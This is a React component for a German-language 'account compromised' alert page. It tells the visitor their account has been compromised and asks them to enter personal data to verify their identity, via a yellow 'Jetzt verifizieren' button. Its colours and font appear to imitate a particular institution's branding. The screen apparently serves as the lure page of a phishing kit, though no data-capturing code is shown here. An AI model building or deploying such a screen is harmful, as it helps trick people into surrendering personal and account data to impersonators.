import React from 'react';

interface AccountCompromisedScreenProps {
  onStartVerification: () => void;
}

const AccountCompromisedScreen: React.FC<AccountCompromisedScreenProps> = ({ onStartVerification }) => {
  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .mobile-title {
              font-size: 2.5rem !important;
            }
          }
          @media (max-width: 480px) {
            .mobile-title {
              font-size: 2rem !important;
            }
          }
        `}
      </style>
      <div style={{ 
        maxWidth: '1440px', 
        margin: '0 auto', 
        padding: '4rem 0',
        minHeight: '80vh',
        display: 'flex',
        alignItems: 'flex-start',
        paddingTop: '6rem'
      }}>
        <div style={{
          maxWidth: '800px',
          width: '100%',
          padding: '0 2rem'
        }}>
          {/* Large Achtung Title */}
          <h1 className="mobile-title" style={{
            color: '#002e3c',
            fontSize: '2.5rem',
            fontWeight: 'bold',
            marginBottom: '2rem',
            fontFamily: 'Gotham, Arial, sans-serif',
            lineHeight: '1.1',
            letterSpacing: '-0.02em'
          }}>
            Achtung
          </h1>
          
          {/* Subtitle */}
          <h2 style={{
            color: '#002e3c',
            fontSize: '1.5rem',
            fontWeight: '600',
            marginBottom: '2rem',
            fontFamily: 'Gotham, Arial, sans-serif',
            lineHeight: '1.3'
          }}>
            Ihr Konto wurde kompromittiert
          </h2>
          
          {/* Information Text */}
          <div style={{ marginBottom: '2.5rem' }}>
            <p style={{
              color: '#002e3c',
              fontSize: '1rem',
              lineHeight: '1.6',
              marginBottom: '1rem',
              fontFamily: 'Gotham, Arial, sans-serif',
              fontWeight: '500'
            }}>
              <strong>Hinweis:</strong> Um den Zugang wiederherzustellen, müssen Sie Ihre Identität verifizieren.
            </p>
            
            <p style={{
              color: '#002e3c',
              fontSize: '1rem',
              lineHeight: '1.6',
              marginBottom: '0',
              fontFamily: 'Gotham, Arial, sans-serif'
            }}>
              Bitte geben Sie Ihre persönlichen Daten zur Verifizierung ein.
            </p>
          </div>
          
          {/* Yellow Button with Arrow */}
          <button
            onClick={onStartVerification}
            style={{
              backgroundColor: '#FFD700',
              color: '#002e3c',
              border: 'none',
              borderRadius: '35px',
              padding: '1.25rem 3rem',
              fontSize: '1rem',
              fontWeight: '600',
              cursor: 'pointer',
              fontFamily: 'Gotham, Arial, sans-serif',
              transition: 'all 0.3s ease',
              display: 'flex',
              alignItems: 'center',
              gap: '0.5rem'
            }}
            onMouseOver={(e) => {
              e.currentTarget.style.backgroundColor = '#FFD700';
              e.currentTarget.style.boxShadow = '0 4px 12px rgba(255, 215, 0, 0.3)';
            }}
            onMouseOut={(e) => {
              e.currentTarget.style.backgroundColor = '#FFD700';
              e.currentTarget.style.boxShadow = 'none';
            }}
          >
            Jetzt verifizieren
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M5 12h14M12 5l7 7-7 7"/>
            </svg>
          </button>
        </div>
      </div>
    </>
  );
};

export default AccountCompromisedScreen; 